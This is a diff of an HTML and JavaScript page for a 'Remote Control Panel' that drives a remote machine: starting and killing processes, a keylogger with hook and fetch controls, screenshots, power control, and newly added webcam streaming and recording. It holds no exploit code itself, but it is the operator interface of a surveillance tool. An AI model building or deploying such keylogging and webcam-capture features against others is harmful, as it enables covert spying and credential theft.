@@ -14,94 +14,120 @@
 </head>
 <body class="bg-light">
 
-<div class="container mt-4">
-    <h2 class="text-center mb-4">🎛️ Remote Control Panel</h2>
+    <div class="container mt-4">
+        <h2 class="text-center mb-4">🎛️ Remote Control Panel</h2>
 
-    <div class="row">
-        <div class="col-md-12">
-            <div class="feature-box bg-white border-primary">
-                <h4 class="text-primary">🚀 Start Application / Process</h4>
-                <div class="input-group">
-                    <input type="text" id="startProcInput" class="form-control" placeholder="Enter name (e.g., edge, chrome, calc) or path...">
-                    <button class="btn btn-success" onclick="startProcess()">Start</button>
+        <div class="row">
+            <div class="col-md-12">
+                <div class="feature-box bg-white border-primary">
+                    <h4 class="text-primary">🚀 Start Application / Process</h4>
+                    <div class="input-group">
+                        <input type="text" id="startProcInput" class="form-control" placeholder="Enter name (e.g., edge, chrome, calc) or path...">
+                        <button class="btn btn-success" onclick="startProcess()">Start</button>
+                    </div>
+                    <small class="text-muted">Shortcuts: edge, chrome, word, excel, notepad, calc, paint, cmd...</small>
                 </div>
-                <small class="text-muted">Shortcuts: edge, chrome, word, excel, notepad, calc, paint, cmd...</small>
             </div>
         </div>
+
+        <div class="row">
+            <div class="col-md-6">
+                <div class="feature-box bg-white">
+                    <h4>🖥️ Running Processes</h4>
+                    <div class="input-group mb-2">
+                        <button class="btn btn-primary btn-sm" onclick="getProcesses()">Refresh</button>
+                        <input type="text" id="pidInput" class="form-control form-control-sm" placeholder="Enter PID">
+                        <button class="btn btn-danger btn-sm" onclick="killProcess()">Kill PID</button>
+                    </div>
+                    <div style="height: 300px; overflow-y: auto; border: 1px solid #ccc;">
+                        <table class="table table-sm table-striped" style="font-size: 0.8rem;">
+                            <thead class="table-dark"><tr><th>Name</th><th>PID</th><th>Threads</th></tr></thead>
+                            <tbody id="processTable"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+                <div class="feature-box bg-white">
+                    <h4>📱 Running Applications</h4>
+                    <div class="mb-2">
+                        <button class="btn btn-primary btn-sm" onclick="getApps()">Refresh</button>
+                        <input type="text" id="appIdInput" class="d-inline-block form-control form-control-sm w-50" placeholder="Enter App ID">
+                        <button class="btn btn-danger btn-sm" onclick="killApp()">Kill App</button>
+                    </div>
+                    <ul id="appList" class="list-group" style="height: 300px; overflow-y: auto;"></ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="row">
+            <div class="col-md-6">
+                <div class="feature-box bg-white">
+                    <h4>
+                        ⌨️ Keylogger
+                        <span id="keylogStatus" class="badge bg-secondary status-badge">Unknown</span>
+                    </h4>
+                    <div class="btn-group w-100 mb-2">
+                        <button class="btn btn-warning" onclick="keylogAction('HOOK')">Hook (On)</button>
+                        <button class="btn btn-secondary" onclick="keylogAction('UNHOOK')">Unhook (Off)</button>
+                        <button class="btn btn-danger" onclick="clearKeylog()">Clear Log</button>
+                        <button class="btn btn-info" onclick="getKeylogData()">Fetch Data</button>
+                    </div>
+                    <div class="form-check mb-2">
+                        <input class="form-check-input" type="checkbox" id="autoKeylogCheck" onchange="toggleAutoKeylog()">
+                        <label class="form-check-label" for="autoKeylogCheck">Auto Update (3s)</label>
+                    </div>
+                    <textarea id="keylogArea" class="form-control log-area" rows="8" readonly placeholder="Keystrokes will appear here..."></textarea>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+                <div class="feature-box bg-white">
+                    <h4>📸 Screenshot</h4>
+                    <button class="btn btn-primary w-100" onclick="takeScreenshot()">Take Screenshot</button>
+                    <img id="screenshot-img" src="" alt="Screenshot">
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-12">
+                <div class="feature-box bg-white border border-warning border-2">
+                    <h4>🎥 Webcam Streaming & Recording</h4>
+
+                    <div class="mb-3 text-center">
+                        <button class="btn btn-success" onclick="webcamAction('WEBCAM_START')">
+                            ▶ Start Stream
+                        </button>
+                        <button class="btn btn-secondary" onclick="webcamAction('WEBCAM_STOP')">
+                            ⏹ Stop All
+                        </button>
+                        <span class="mx-3 text-muted">|</span>
+                        <button class="btn btn-danger" onclick="webcamAction('WEBCAM_RECORD_ON')">
+                            ⏺ Record (Server)
+                        </button>
+                        <button class="btn btn-outline-danger" onclick="webcamAction('WEBCAM_RECORD_OFF')">
+                            💾 Save
+                        </button>
+                    </div>
+
+                    <div class="text-center bg-dark d-flex justify-content-center align-items-center rounded" style="min-height: 480px; background-color: #000 !important;">
+                        <img id="videoFeed" src="" style="max-width: 100%; max-height: 500px; border: 1px solid #444;" alt="Camera is OFF">
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-12">
+                <div class="feature-box bg-danger text-white">
+                    <h4>⚠️ Power Control</h4>
+                    <button class="btn btn-light" onclick="powerAction('SHUTDOWN')">Shutdown Server</button>
+                    <button class="btn btn-warning" onclick="powerAction('RESTART')">Restart Server</button>
+                </div>
+            </div>
+        </div>
+
     </div>
-
-    <div class="row">
-        <div class="col-md-6">
-            <div class="feature-box bg-white">
-                <h4>🖥️ Running Processes</h4>
-                <div class="input-group mb-2">
-                    <button class="btn btn-primary btn-sm" onclick="getProcesses()">Refresh</button>
-                    <input type="text" id="pidInput" class="form-control form-control-sm" placeholder="Enter PID">
-                    <button class="btn btn-danger btn-sm" onclick="killProcess()">Kill PID</button>
-                </div>
-                <div style="height: 300px; overflow-y: auto; border: 1px solid #ccc;">
-                    <table class="table table-sm table-striped" style="font-size: 0.8rem;">
-                        <thead class="table-dark"><tr><th>Name</th><th>PID</th><th>Threads</th></tr></thead>
-                        <tbody id="processTable"></tbody>
-                    </table>
-                </div>
-            </div>
-        </div>
-
-        <div class="col-md-6">
-            <div class="feature-box bg-white">
-                <h4>📱 Running Applications</h4>
-                <div class="mb-2">
-                    <button class="btn btn-primary btn-sm" onclick="getApps()">Refresh</button>
-                    <input type="text" id="appIdInput" class="d-inline-block form-control form-control-sm w-50" placeholder="Enter App ID">
-                    <button class="btn btn-danger btn-sm" onclick="killApp()">Kill App</button>
-                </div>
-                <ul id="appList" class="list-group" style="height: 300px; overflow-y: auto;"></ul>
-            </div>
-        </div>
-    </div>
-
-    <div class="row">
-        <div class="col-md-6">
-            <div class="feature-box bg-white">
-                <h4>
-                    ⌨️ Keylogger 
-                    <span id="keylogStatus" class="badge bg-secondary status-badge">Unknown</span>
-                </h4>
-                <div class="btn-group w-100 mb-2">
-                    <button class="btn btn-warning" onclick="keylogAction('HOOK')">Hook (On)</button>
-                    <button class="btn btn-secondary" onclick="keylogAction('UNHOOK')">Unhook (Off)</button>
-                    <button class="btn btn-danger" onclick="clearKeylog()">Clear Log</button>
-                    <button class="btn btn-info" onclick="getKeylogData()">Fetch Data</button>
-                </div>
-                <div class="form-check mb-2">
-                    <input class="form-check-input" type="checkbox" id="autoKeylogCheck" onchange="toggleAutoKeylog()">
-                    <label class="form-check-label" for="autoKeylogCheck">Auto Update (3s)</label>
-                </div>
-                <textarea id="keylogArea" class="form-control log-area" rows="8" readonly placeholder="Keystrokes will appear here..."></textarea>
-            </div>
-        </div>
-
-        <div class="col-md-6">
-            <div class="feature-box bg-white">
-                <h4>📸 Screenshot</h4>
-                <button class="btn btn-primary w-100" onclick="takeScreenshot()">Take Screenshot</button>
-                <img id="screenshot-img" src="" alt="Screenshot">
-            </div>
-        </div>
-    </div>
-
-    <div class="row">
-        <div class="col-md-12">
-            <div class="feature-box bg-danger text-white">
-                <h4>⚠️ Power Control</h4>
-                <button class="btn btn-light" onclick="powerAction('SHUTDOWN')">Shutdown Server</button>
-                <button class="btn btn-warning" onclick="powerAction('RESTART')">Restart Server</button>
-            </div>
-        </div>
-    </div>
-
-</div>
 
 <script>
     // Hàm gọi API chung để tái sử dụng code
@@ -249,6 +275,37 @@
         if(confirm("Are you sure?")) {
             await apiCall('/api/power', 'POST', {action: action});
             alert("Sent command: " + action);
+        }
+    }
+    // --- Webcam Logic (THÊM MỚI) ---
+    // --- Webcam Logic ---
+    async function webcamAction(action) {
+        // action ở đây sẽ là: 'WEBCAM_START', 'WEBCAM_STOP', ...
+        // Nó sẽ được Python chuyển thành sub_command và gửi sang C#
+        
+        const res = await apiCall('/api/webcam', 'POST', { action: action });
+
+        const img = document.getElementById('videoFeed');
+
+        // Logic hiển thị trên Web
+        if (action === 'WEBCAM_START') {
+            if (res.status === 'success') {
+                // Thêm timestamp để ép trình duyệt tải lại luồng mới
+                img.src = "/video_feed?" + new Date().getTime();
+                img.style.border = "2px solid #28a745"; // Viền xanh báo đang chạy
+            } else {
+                alert("Lỗi bật Camera: " + res.message);
+            }
+        } 
+        else if (action === 'WEBCAM_STOP') {
+            img.src = ""; 
+            img.alt = "Camera Stopped";
+            img.style.border = "1px solid #444";
+            if (res.status !== 'success') alert(res.message);
+        } 
+        else {
+            // Các lệnh Record: Chỉ cần hiện thông báo trả về từ C#
+            alert(res.message); 
         }
     }
 </script>
